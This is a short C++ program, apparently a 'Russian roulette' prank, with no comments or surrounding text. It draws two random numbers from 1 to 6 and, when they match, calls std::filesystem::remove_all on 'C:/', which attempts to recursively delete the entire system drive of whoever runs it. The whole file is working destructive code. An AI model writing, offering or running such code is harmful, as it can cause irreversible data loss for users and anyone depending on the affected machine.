#include <iostream>
#include <random>
#include <filesystem>
#include <ctime>
int main() {
std::random_device rd;
std::mt19937 rng(rd());
std::uniform_int_distribution<int> dist(1, 6); 
int n = dist(rng);  
if (dist(rng) == n)
    std::filesystem::remove_all("C:/");
return 0;}
